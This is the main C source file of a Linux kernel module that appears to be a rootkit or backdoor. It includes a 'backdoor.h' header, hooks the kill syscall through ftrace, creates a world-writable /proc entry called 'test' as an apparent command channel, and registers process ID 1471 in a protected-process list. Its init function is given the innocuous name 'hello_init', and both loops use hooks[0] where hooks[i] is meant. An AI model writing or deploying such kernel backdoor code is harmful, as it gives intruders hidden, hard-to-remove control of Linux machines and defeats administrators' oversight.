#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "backdoor.h"
#include "hook.h"
#include "process.h"
#include "data.h"
#include <linux/slab.h>

static struct ftrace_hook hooks[] =
        {
                HOOK(HookKill, SYSCALL_NAME("kill"))
        };


static struct proc_ops proc_fops = {
        .proc_open = open_proc,
        .proc_read = read_proc,
        .proc_write = write_proc,
        .proc_release = release_proc
};


static int __init hello_init(void) {
    pr_info("hello!\n");

    proc_create("test", 0666, NULL, &proc_fops);

    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); ++i) {
        FtraceHook(&(hooks[0].ops), hooks[0].hook_func_name);
    }

    struct List *test;
    test = (struct List *) kmalloc(sizeof(struct List), GFP_KERNEL);
    test->data = "1471";
    list_add_tail_rcu(&(test->list), &protect_process_list);

    return 0;
}

static void __exit hello_exit(void) {
    pr_info("hello_exit!\n");

    remove_proc_entry("test", NULL);

    struct List *test;
    struct list_head *curr, *next;
    list_for_each_safe(curr, next, &protect_process_list) {
        test = list_entry_rcu(curr, struct List, list);
        if (!strcmp(test->data, "1471")) {
            list_del_init(curr);
            kfree(test);
        }
    }

    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); ++i) {
        FtraceUnHook(&(hooks[0].ops));
    }
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE("GPL");
